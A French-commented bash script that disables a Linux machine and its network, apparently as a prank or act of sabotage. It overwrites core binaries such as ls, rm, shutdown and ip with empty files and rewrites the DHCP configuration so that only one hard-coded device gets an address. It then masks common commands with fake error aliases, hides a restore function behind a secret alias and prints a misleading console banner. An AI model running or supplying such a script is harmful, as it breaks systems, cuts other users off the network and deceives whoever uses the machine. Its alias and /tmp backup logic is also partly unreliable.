#!/bin/bash

# --- Sauvegarde des fichiers et des répertoires critiques avant modification ---
mkdir -p /tmp/backup

# Sauvegarde du fichier DHCP
cp /etc/dhcp/dhcpd.conf /tmp/backup/dhcpd.conf

# Sauvegarde des fichiers binaires critiques
cp /bin/ls /tmp/backup/ls
cp /bin/rm /tmp/backup/rm
cp /bin/mv /tmp/backup/mv
cp /bin/mkdir /tmp/backup/mkdir
cp /bin/touch /tmp/backup/touch
cp /sbin/shutdown /tmp/backup/shutdown
cp /sbin/reboot /tmp/backup/reboot
cp /bin/ip /tmp/backup/ip

# Désactiver les commandes essentielles en les remplaçant par des fichiers vides
echo "" > /bin/ls
echo "" > /bin/rm
echo "" > /bin/mv
echo "" > /bin/mkdir
echo "" > /bin/touch
echo "" > /sbin/shutdown
echo "" > /sbin/reboot
echo "" > /bin/ip

# --- Modification temporaire du fichier DHCP ---
# Ne permettre qu'à une seule machine de se connecter au réseau
ALLOWED_IP="192.168.31.7"
ALLOWED_MAC="48:B5:4E:58:C6:77"

cat <<EOL > /etc/dhcp/dhcpd.conf
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.31.0 netmask 255.255.255.0 {
  range $ALLOWED_IP $ALLOWED_IP;
  option routers 192.168.31.1;
  option domain-name-servers 8.8.8.8;

  host allowed_device {
    hardware ethernet $ALLOWED_MAC;
    fixed-address $ALLOWED_IP;
  }
}
EOL

# Redémarrer le service DHCP
systemctl restart isc-dhcp-server

# --- Désactivation des alias ---
alias ls="echo 'Commande non reconnue.'"
alias cd="echo 'Commande non reconnue.'"
alias rm="echo 'Commande non reconnue.'"
alias mv="echo 'Commande non reconnue.'"
alias mkdir="echo 'Commande non reconnue.'"
alias touch="echo 'Commande non reconnue.'"
alias shutdown="echo 'Commande non reconnue.'"
alias reboot="echo 'Commande non reconnue.'"
alias ifconfig="echo 'Commande non reconnue.'"
alias ip="echo 'Commande non reconnue.'"
alias ping="echo 'Commande non reconnue.'"

# --- Fonction de restauration complète du système ---
function restore_system {
    # Restaurer les fichiers binaires critiques
    cp /tmp/backup/ls /bin/ls
    cp /tmp/backup/rm /bin/rm
    cp /tmp/backup/mv /bin/mv
    cp /tmp/backup/mkdir /bin/mkdir
    cp /tmp/backup/touch /bin/touch
    cp /tmp/backup/shutdown /sbin/shutdown
    cp /tmp/backup/reboot /sbin/reboot
    cp /tmp/backup/ip /bin/ip

    # Restaurer le fichier de configuration DHCP
    cp /tmp/backup/dhcpd.conf /etc/dhcp/dhcpd.conf
    systemctl restart isc-dhcp-server

    # Supprimer les alias
    unalias -a

    echo "Le système a été entièrement restauré."
}

# Créer un alias pour restaurer le système
alias JaimeMonDelegue="restore_system"

clear&&echo -e "\nHi, I'm a Linux Console\n"